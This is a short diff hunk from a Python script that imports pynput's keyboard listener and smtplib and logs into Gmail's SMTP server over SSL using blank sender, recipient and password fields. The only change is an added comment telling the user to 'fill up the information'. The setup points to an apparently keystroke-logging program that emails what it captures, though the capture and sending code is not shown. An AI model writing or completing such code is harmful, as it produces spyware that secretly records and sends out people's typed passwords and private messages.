@@ -2,10 +2,11 @@ import os.path
 import smtplib
 from pynput.keyboard import Key, Listener
 
-
+#Fill up the information
 send_email = ""
 recv = ""
 password = ""
+
 server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
 server.login(send_email,password)
 
